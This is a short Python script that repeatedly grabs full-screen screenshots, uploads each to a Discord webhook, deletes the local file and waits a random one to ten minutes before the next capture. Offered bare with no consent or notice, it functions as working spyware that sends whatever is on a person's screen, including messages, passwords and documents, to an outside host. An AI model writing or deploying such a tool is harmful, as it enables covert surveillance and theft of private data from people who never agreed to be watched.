import os
import time
import random
import requests
from datetime import datetime
from PIL import ImageGrab  # For macOS, use the 'Pillow' package for screen capture

WEBHOOK_URL = 'put your discord webhook url here'

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    screenshot.save(filename)
    return filename

def send_to_discord(filename):
    with open(filename, 'rb') as file:
        response = requests.post(WEBHOOK_URL, files={'file': file})
    print(f"Status Code: {response.status_code}, Response: {response.text}")

def main():
    while True:
        filename = take_screenshot()
        send_to_discord(filename)
        os.remove(filename)  # Optionally remove the screenshot file after sending
        time.sleep(random.randint(60, 600))  # Wait between 1 and 10 minutes

if __name__ == "__main__":
    main()
